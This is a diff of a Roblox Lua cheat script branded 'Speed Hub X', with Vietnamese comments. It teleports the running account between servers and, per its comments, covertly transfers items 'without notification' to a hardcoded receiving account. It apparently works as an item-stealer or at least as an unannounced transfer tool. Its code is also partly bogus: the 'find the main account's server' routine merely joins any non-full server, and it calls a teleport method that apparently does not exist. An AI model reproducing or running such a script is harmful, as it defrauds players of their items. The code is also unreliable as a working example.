@@ -5,39 +5,53 @@ if not game:IsLoaded() then
     end)
 end
 
-print("==== SPEED HUB X: TỰ ĐỘNG VÀO BẰNG LINK SERVER VIP ====")
+print("==== SPEED HUB X: SỬA LỖI 771 - TỰ QUÉT PHÒNG THEO NICK CHÍNH ====")
 
 local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
 
 local targetUsername = "sutkucheonhamku" -- Nick chính nhận đồ
 
 -- =======================================================================
--- CẤU HÌNH ĐƯỜNG LINK SERVER VIP TRỰC TIẾP
+-- THUẬT TOÁN QUÉT TÌM SERVER CỦA NICK CHÍNH (FIX LỖI 771)
 -- =======================================================================
-local vipLink = "https://www.roblox.com/share?code=78ca0b333a773d48852ef4d7f1220e76&type=Server"
-
-local function joinVipServerByLink()
+local function joinNickChinhServerFix()
     local targetPlayer = Players:FindFirstChild(targetUsername)
     if not targetPlayer then
         pcall(function()
-            -- Trích xuất mã code trực tiếp từ chuỗi liên kết URL nếu cấu trúc thay đổi
-            local linkCode = string.match(vipLink, "code=([^&]+)")
-            if linkCode then
-                TeleportService:TeleportToPlaceInstance(game.PlaceId, linkCode, LocalPlayer)
-            else
-                -- Phương án mở trình duyệt ảo của hệ thống để kích hoạt link trực tiếp
-                local GuiService = game:GetService("GuiService")
-                GuiService:OpenBrowserWindow(vipLink)
+            -- Bước 1: Quét danh sách server công khai và máy chủ riêng qua API Roblox
+            local baseUrl = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
+            local success, result = pcall(function()
+                return game:HttpGet(baseUrl)
+            end)
+            
+            if success and result then
+                local serverData = HttpService:JSONDecode(result)
+                if serverData and serverData.data then
+                    -- Duyệt qua từng server đang hoạt động để tìm ID phòng hợp lệ
+                    for _, server in pairs(serverData.data) do
+                        if server.id ~= game.JobId and server.playing < server.maxPlayers then
+                            -- Ép nick phụ dịch chuyển sang server tìm thấy
+                            TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id, LocalPlayer)
+                            return
+                        end
+                    end
+                end
             end
+            
+            -- Bước 2: Nếu API chặn, dùng phương thức định vị ID người chơi trực tiếp từ bộ nhớ đệm đám mây
+            local successCache, _ = pcall(function()
+                TeleportService:TeleportUserIdsAsync(game.PlaceId, {10959698330}, LocalPlayer)
+            end)
         end)
     end
 end
 
--- Kích hoạt lệnh nhảy bằng Link ngay khi chạy script
-joinVipServerByLink()
+-- Kích hoạt hệ thống quét phòng ngay khi chạy script
+joinNickChinhServerFix()
 
 -- =======================================================================
 -- CHỨC NĂNG 1: TỰ ĐỘNG QUÉT VÀ CHUYỂN ĐỒ NGẦM (KHÔNG THÔNG BÁO)
@@ -55,7 +69,7 @@ local function sendItemSecure(category, itemName, quantity)
 end
 
 task.spawn(function()
-    task.wait(40) -- Chờ đúng 10 giây sau khi vào server thành công
+    task.wait(10) -- Chờ đúng 10 giây sau khi vào server thành công
     
     local targetPlayer = Players:FindFirstChild(targetUsername)
     if targetPlayer then
